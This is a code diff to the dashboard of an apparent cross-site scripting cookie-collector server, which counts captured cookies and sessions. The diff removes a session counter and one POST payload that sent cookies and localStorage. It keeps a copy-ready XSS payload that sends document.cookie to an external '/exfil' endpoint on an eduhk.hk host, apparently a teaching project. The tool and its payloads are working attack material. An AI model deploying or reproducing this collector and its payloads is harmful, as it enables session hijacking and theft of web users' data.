@@ -211,10 +211,6 @@ app.get('/', (req, res) => {
         <div class="stat-label">TOTAL REQUESTS</div>
       </div>
       <div class="stat-card">
-        <div class="stat-number" id="sessionCount">${exfiltratedData.filter(d => d.body?.cookie).length}</div>
-        <div class="stat-label">SESSIONS CAPTURED</div>
-      </div>
-      <div class="stat-card">
         <div class="stat-number" id="cookieCount">${exfiltratedData.filter(d => d.query?.data || d.body?.cookie).length}</div>
         <div class="stat-label">COOKIES RECEIVED</div>
       </div>
@@ -291,16 +287,11 @@ app.get('/', (req, res) => {
         </ol>
         
         <div class="mt-3">
-          <strong style="color: #ffaa00;">🎯 Example XSS Payloads (click to copy):</strong>
+          <strong style="color: #ffaa00;">🎯 Example XSS Payload (click to copy):</strong>
           
           <div class="payload-container">
             <button class="copy-btn" onclick="copyPayload(this, 0)">📋 COPY</button>
             <pre id="payload-0">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
-          </div>
-          
-          <div class="payload-container">
-            <button class="copy-btn" onclick="copyPayload(this, 1)">📋 COPY</button>
-            <pre id="payload-1">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
           </div>
         </div>
       </div>
